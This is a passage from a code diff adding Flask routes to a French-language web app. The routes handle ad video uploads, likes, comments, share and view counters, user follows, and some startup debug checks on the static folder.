+        # Vérifier que le fichier existe vraiment avant de continuer
+        if not os.path.exists(video_path):
+            print("ERREUR CRITIQUE: Le fichier n'a pas été sauvegardé!")
+            return jsonify({"success": False, "message": "Erreur lors de la sauvegarde de la vidéo"}), 500
+        
+    except Exception as e:
+        import traceback
+        print(f"ERREUR lors de la sauvegarde: {str(e)}")
+        print(f"Traceback complet:")
+        traceback.print_exc()
+        return jsonify({"success": False, "message": f"Erreur sauvegarde: {str(e)}"}), 500
+    
+    # IMPORTANT: URL générée correspond au dossier réel utilisé (static/uploads)
+    video_url = f"/static/uploads/{unique_filename}"
+    print(f"video_url = {video_url}")
+    
+    # Créer la publicité
+    nouvelle_publicite = Publicite(
+        boutique_id=boutique.id,
+        user_id=user.id,
+        produit_id=produit_id if produit else None,
+        video_url=video_url,
+        titre=titre,
+        description=description if description else None,
+        prix=prix,
+        devise=devise,
+        est_actif=True
+    )
+    
+    db.session.add(nouvelle_publicite)
+    db.session.commit()
+    
+    print(f"Publicité créée avec ID = {nouvelle_publicite.id}")
+    print("=" * 60)
+    
+    return jsonify({
+        "success": True,
+        "message": "Publicité publiée avec succès",
+        "publicite_id": nouvelle_publicite.id
+    })
+
+
+@app.route("/api/publicite/<int:pub_id>/like", methods=["POST"])
+@login_required
+def api_like_publicite(pub_id):
+    """API pour liker/retirer un like d'une publicité"""
+    user = get_logged_in_user()
+    publicite = Publicite.query.get_or_404(pub_id)
+    
+    # Vérifier si déjà liké
+    existing_like = LikePublicite.query.filter_by(
+        publicite_id=pub_id,
+        user_id=user.id
+    ).first()
+    
+    if existing_like:
+        # Retirer le like
+        db.session.delete(existing_like)
+        publicite.likes = max(0, publicite.likes - 1)
+        liked = False
+    else:
+        # Ajouter le like
+        new_like = LikePublicite(publicite_id=pub_id, user_id=user.id)
+        db.session.add(new_like)
+        publicite.likes += 1
+        liked = True
+    
+    db.session.commit()
+    
+    return jsonify({
+        "success": True,
+        "liked": liked,
+        "likes": publicite.likes
+    })
+
+
+@app.route("/api/publicite/<int:pub_id>/commentaires", methods=["GET"])
+def api_commentaires_publicite(pub_id):
+    """API pour récupérer les commentaires d'une publicité"""
+    publicite = Publicite.query.get_or_404(pub_id)
+    
+    commentaires = CommentairePublicite.query.filter_by(publicite_id=pub_id).order_by(CommentairePublicite.date_creation.desc()).limit(50).all()
+    
+    result = []
+    for c in commentaires:
+        result.append({
+            "id": c.id,
+            "user": c.user.username,
+            "texte": c.texte,
+            "date": c.date_creation.strftime("%d/%m/%Y %H:%M") if c.date_creation else ""
+        })
+    
+    return jsonify(result)
+
+
+@app.route("/api/publicite/<int:pub_id>/commentaire", methods=["POST"])
+@login_required
+def api_ajouter_commentaire(pub_id):
+    """API pour ajouter un commentaire à une publicité"""
+    user = get_logged_in_user()
+    publicite = Publicite.query.get_or_404(pub_id)
+    
+    data = request.get_json()
+    texte = data.get('texte', '').strip()
+    
+    if not texte:
+        return jsonify({"success": False, "message": "Commentaire vide"}), 400
+    
+    nouveau_commentaire = CommentairePublicite(
+        publicite_id=pub_id,
+        user_id=user.id,
+        texte=texte
+    )
+    
+    db.session.add(nouveau_commentaire)
+    publicite.commentaires_count = (publicite.commentaires_count or 0) + 1
+    db.session.commit()
+    
+    return jsonify({
+        "success": True,
+        "message": "Commentaire ajouté"
+    })
+
+
+@app.route("/api/publicite/<int:pub_id>/share", methods=["POST"])
+def api_share_publicite(pub_id):
+    """API pour incrémenter le compteur de partages"""
+    publicite = Publicite.query.get_or_404(pub_id)
+    publicite.partages = (publicite.partages or 0) + 1
+    db.session.commit()
+    
+    return jsonify({"success": True, "partages": publicite.partages})
+
+
+@app.route("/api/publicite/<int:pub_id>/vue", methods=["POST"])
+def api_vue_publicite(pub_id):
+    """API pour incrémenter le compteur de vues"""
+    publicite = Publicite.query.get_or_404(pub_id)
+    publicite.vues = (publicite.vues or 0) + 1
+    db.session.commit()
+    
+    return jsonify({"success": True, "vues": publicite.vues})
+
+
+# ==============================
+# 👥 ROUTES POUR LES FOLLOWERS/ABONNEMENTS
+# ==============================
+
+@app.route("/api/user/<int:user_id>/follow", methods=["POST"])
+@login_required
+def api_follow_user(user_id):
+    """API pour suivre/unfollow un utilisateur"""
+    user = get_logged_in_user()
+    target_user = User.query.get_or_404(user_id)
+    
+    if user.id == target_user.id:
+        return jsonify({"success": False, "message": "Impossible de se suivre soi-même"}), 400
+    
+    # Vérifier si déjà following
+    existing_follow = Follow.query.filter_by(
+        follower_id=user.id,
+        following_id=target_user.id
+    ).first()
+    
+    if existing_follow:
+        db.session.delete(existing_follow)
+        followed = False
+    else:
+        new_follow = Follow(follower_id=user.id, following_id=target_user.id)
+        db.session.add(new_follow)
+        followed = True
+    
+    db.session.commit()
+    
+    return jsonify({
+        "success": True,
+        "followed": followed,
+        "followers_count": target_user.followers.count()
+    })
+
+
+@app.route("/user/<username>/followers")
+def user_followers(username):
+    """Page pour voir les followers d'un utilisateur"""
+    user = User.query.filter_by(username=username).first_or_404()
+    followers = user.followers.all()
+    return render_template("user_followers.html", 
+        target_user=user, 
+        followers=followers,
+        user=get_logged_in_user())
+
+
+@app.route("/user/<username>/following")
+def user_following(username):
+    """Page pour voir les abonnements d'un utilisateur"""
+    user = User.query.filter_by(username=username).first_or_404()
+    following = user.following.all()
+    return render_template("user_following.html", 
+        target_user=user, 
+        following=following,
+        user=get_logged_in_user())
+
+
+# Initialiser les catégories au démarrage
+with app.app_context():
+    try:
+        init_categories()
+    except:
+        pass  # Ignore les erreurs si la table n'existe pas encore
+
+
+# DEBUG: Vérification du dossier static au démarrage
+print("=" * 60)
+print("DEBUG STARTUP - VERIFICATION DOSSIER STATIC")
+print("=" * 60)
+print("APP_ROOT =", app.root_path)
+static_path = os.path.join(app.root_path, "static")
+print("static_path =", static_path)
+print("exists =", os.path.exists(static_path))
+print("isdir =", os.path.isdir(static_path))
+if os.path.exists(static_path):
+    print("contenu =", os.listdir(static_path))
+print("=" * 60)
+
+# TEST ECRITURE DANS STATIC AU DEMARRAGE
+test_path = os.path.join(app.root_path, "static", "startup_test.txt")
+try:
+    with open(test_path, "w", encoding="utf-8") as f:
+        f.write("startup test")
+    print("TEST ECRITURE OK :", test_path)
+except Exception as e:
+    print("TEST ECRITURE ECHEC :", e)
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 10000))  # Render fournit le PORT
+    app.run(host="0.0.0.0", port=port, debug=False)
